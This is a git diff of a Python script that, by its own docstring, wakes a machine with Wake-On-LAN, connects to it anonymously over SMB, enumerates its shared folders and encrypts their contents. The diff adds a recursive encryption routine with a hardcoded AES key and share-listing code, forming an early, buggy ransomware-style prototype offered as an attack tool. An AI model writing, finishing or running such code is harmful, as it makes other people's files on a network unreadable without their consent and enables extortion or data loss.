@@ -1,15 +1,14 @@
-import os
 import sys
 from wakeonlan import send_magic_packet
 import ipaddress
 import time
-import demo
 from pythonping import ping
 from smb.SMBConnection import SMBConnection
 import socket
-
-from smbprotocol import Dialects
-from smbprotocol.connection import Connection
+import tempfile
+#from Cryptodome.Cipher import AES
+import pyAesCrypt as aes
+import arp_test
 
 '''
 Simple and goofy Python script which exploits the Wake-On-LAN technology
@@ -21,7 +20,33 @@ until it receives feedback; at this point, it scouts for any folders and files s
 over the local network. If there are any, it encrypts all the content.
 Wakie wakie!!
 '''
-import arp_test
+
+
+def recursive_encrypt(conn, shared_folder_name, path):
+    key = b'sixteen byte key'
+    #cipher = AES.new(key, AES.MODE_EAX)
+    import pdb
+    #pdb.set_trace()
+
+    shared_files_list = conn.listPath(shared_folder_name, path, timeout=30)
+    print(shared_files_list)
+    for i in range(len(shared_files_list)):
+        print("    File[", i, "] =", shared_files_list[i].filename)
+    for p in shared_files_list:
+        if p.filename != '.' and p.filename != '..':
+            parent_path = path
+            if not parent_path.endswith('/'):
+                parent_path += '/'
+
+            if p.isDirectory:
+                recursive_encrypt(conn, parent_path + p.filename, shared_folder_name)
+                print('Encrypting folder (%s) in %s' % (p.filename, path))
+            else:
+                print('Encrypting file (%s) in %s' % (p.filename, path))
+
+                aes.encryptFile(p.filename, "pippo.aes", 'a sixteen byte key')
+                print("Successfully encrypted")
+
 
 print(sys.argv)
 if len(sys.argv) != 2:
@@ -42,13 +67,28 @@ if isinstance(sys.argv[1], str):
     print('Connection established, I think...')
     # Now we scan for any shared files or folders using smb
 
-    conn = SMBConnection('', '', 'Hostname', socket.getfqdn(sys.argv[1]), '', True,
+    netBiosName = socket.getfqdn(sys.argv[1])
+    conn = SMBConnection('', '', 'testClient', netBiosName, '', True,
                          SMBConnection.SIGN_WHEN_SUPPORTED,
                          True)
-    assert conn.connect(sys.argv[1], 445)
-    Response = conn.listPath(3, )  # obtain a list of shares
-    print('Shares on: ' + socket.getfqdn(sys.argv[1]))
-    for i in range(len(Response)):
-        print("    File[", i, "] =", Response[i])
 
-    print("moertacci de pippo!")
+    assert conn.connect(sys.argv[1], 445)
+
+    Response = conn.listShares(timeout=30)  # obtain a list of shares
+    #print('Shares on: ' + sys.argv[1])
+
+    Response[2].name
+    for i in range(len(Response)):  # iterate through the list of shares
+        #print("  Share[", i, "] =", Response[i].name)
+
+        try:
+            # list the files on each share (recursivity?)
+            Response2 = conn.listPath(Response[i].name, '/', timeout=30)
+            #print('    Files on: ' + sys.argv[1] + '/' + "  Share[", i, "] =",
+            #Response[i].name)
+            #for i in range(len(Response2)):
+                #print("    File[", i, "] =", Response2[i].filename)
+        except:
+            print('### can not access the resource')
+
+    recursive_encrypt(conn, Response[2].name, '/')
